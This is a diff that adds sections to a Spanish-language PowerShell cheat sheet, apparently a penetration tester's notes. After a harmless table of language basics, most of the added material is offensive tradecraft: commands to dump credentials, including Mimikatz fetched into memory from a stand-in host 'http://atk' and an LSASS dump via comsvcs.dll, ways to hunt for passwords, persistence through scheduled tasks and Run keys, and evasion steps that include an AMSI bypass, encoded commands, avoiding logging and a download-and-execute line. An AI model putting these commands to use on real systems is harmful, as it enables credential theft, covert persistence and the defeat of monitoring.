@@ -54,3 +54,61 @@
 |`Export-Csv`|Exporta resultados a formato CSV.|`Get-Process \| Export-Csv -Path ./procs.csv`|
 |`ConvertTo-Json`|Convierte objetos a formato JSON para API.|`Get-Service \| ConvertTo-Json`|
 |`Compress-Archive`|Comprime archivos para exfiltración.|`Compress-Archive -Path C:\Confidencial -DestinationPath C:\temp\data.zip`|
+
+# Fundamentos del lenguaje
+
+| Concepto | Sintaxis | Ejemplo |
+|----------|----------|---------|
+| Variable | `$nombre = valor` | `$x = 5` |
+| Pipeline | `cmd1 \| cmd2` | `Get-Process \| Sort-Object CPU` |
+| Filtrar | `Where-Object {…}` (`?`) | `gps \| ? {$_.CPU -gt 100}` |
+| Proyectar | `Select-Object` (`select`) | `gps \| select Name, Id` |
+| Iterar | `ForEach-Object {…}` (`%`) | `1..5 \| % { $_ * 2 }` |
+| Condicional | `if () {} elseif () {} else {}` | `if ($x -gt 0) { "pos" }` |
+| Bucle | `foreach ($i in $c) {}` | `foreach ($f in dir) { $f.Name }` |
+| Operadores | `-eq -ne -gt -lt -like -match` | `$s -match '^\d+$'` |
+| Ayuda | `Get-Help`, `Get-Member` | `gps \| Get-Member` |
+
+> Alias útiles: `gps`=Get-Process, `gci`/`dir`/`ls`=Get-ChildItem, `iwr`=Invoke-WebRequest, `iex`=Invoke-Expression, `gc`/`cat`=Get-Content.
+
+# Credenciales
+
+| Técnica | Ejemplo |
+|---------|---------|
+| Credencial en memoria | `$c = Get-Credential` |
+| PSCredential desde texto | `$p = ConvertTo-SecureString 'pass' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('user',$p)` |
+| Credenciales guardadas | `cmdkey /list` |
+| DPAPI / Vault | `Get-ChildItem` en `%APPDATA%\Microsoft\Credentials` |
+| Buscar passwords | `Get-ChildItem -Recurse -Include *.config,*.xml \| Select-String "password"` |
+| Mimikatz (en memoria) | `IEX(IWR -UseBasicParsing http://atk/Invoke-Mimikatz.ps1); Invoke-Mimikatz -DumpCreds` |
+| LSASS dump | `rundll32 comsvcs.dll, MiniDump <PID> C:\temp\l.dmp full` |
+
+# Persistencia
+
+| Vector | Sintaxis |
+|--------|----------|
+| Tarea programada | `Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute powershell.exe -Argument '-c ...') -Trigger (New-ScheduledTaskTrigger -AtLogon) -TaskName upd` |
+| Run key (registro) | `Set-ItemProperty 'HKCU:\...\Run' -Name x -Value 'powershell -w hidden -c ...'` |
+| Perfil de PowerShell | Añadir comando a `$PROFILE` |
+| Servicio | `New-Service -Name svc -BinaryPathName '...'` |
+| WMI event subscription | `Register-WmiEvent` (sin fichero en disco) |
+
+# Evasión
+
+| Técnica | Sintaxis / nota |
+|---------|-----------------|
+| Modo oculto | `powershell -w hidden -nop -ep bypass -c ...` |
+| `-nop` / `-noni` | No cargar perfil / no interactivo |
+| AMSI bypass | Parchear `AmsiUtils.amsiInitFailed` por reflexión (firmas cambian; ofuscar) |
+| Comando codificado | `powershell -enc <Base64-UTF16LE>` |
+| Constrained Language Mode | Comprobar `$ExecutionContext.SessionState.LanguageMode` |
+| Logging | Evitar **Script Block Logging** / **Transcription** / **Module Logging** |
+| Descarga sin tocar disco | `IEX (New-Object Net.WebClient).DownloadString('http://atk/s.ps1')` |
+
+> AMSI, ScriptBlock Logging y AppLocker/CLM son las defensas que hay que considerar antes de lanzar payloads. PowerShell 2.0 (`-version 2`) evade AMSI si está disponible (downgrade).
+
+# Recursos
+### [[DCsync]] · [[PowerView]]
+### [PowerSploit / PowerView](https://github.com/PowerShellMafia/PowerSploit)
+### [HackTricks — Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
+### [PayloadsAllTheThings — PowerShell](https://github.com/swisskyrepo/PayloadsAllTheThings)
